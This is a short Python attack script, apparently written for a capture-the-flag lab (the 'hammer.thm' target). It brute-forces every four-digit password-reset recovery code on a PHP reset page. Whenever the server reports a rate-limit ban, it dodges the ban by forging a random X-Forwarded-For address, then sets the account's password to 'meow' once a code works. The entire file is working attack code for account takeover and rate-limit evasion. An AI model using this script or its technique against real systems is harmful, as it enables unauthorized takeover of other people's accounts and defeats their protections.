import requests 
import random

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

ip = "10.10.246.147"
reset_url = f"http://{ip}:1337/reset_password.php"
email = "tester@hammer.thm"
email_data = {
    "email": email
}

error_message = "Invalid or expired recovery code!"
banning_message = "Rate limit exceeded. Please try again later."
timing_message = "Time elapsed. Please try again later."

headers = {
    "Host": f"{ip}:1337",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "23",
    "Origin": f"http://{ip}:1337",
    "Connection": "keep-alive",
    "Referer": f"http://{ip}:1337/reset_password.php",
    "Cookie": "PHPSESSID=7pd41l7khuho3c0puajobp3u56",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "X-Forwarded-For": "90.80.70.60"
}

#request to reset the password
session = requests.Session()
found = False

while not found:
    session.post(reset_url, headers=headers, data=email_data)
    for code in range(1000, 10000):
        print("trying code :", code)
        data = {
            "recovery_code": code
        }
        
        req = session.post(reset_url, headers=headers, data=data)
            
        #ip is banned
        if banning_message in req.text:
            headers["X-Forwarded-For"] = generate_random_ip()
            req = session.post(reset_url, headers=headers, data=data)
            
        # code found    
        if not error_message in req.text:
            if timing_message in req.text:
                print("The attack must restart")
            else:
                print(req.text)
                print("Code found :", code)
                print("Resetting password")

                #reset password
                data = {
                    "new_password": "meow",
                    "confirm_password": "meow"
                }
                req = session.post(reset_url, headers=headers, data=data)
                found = True
            break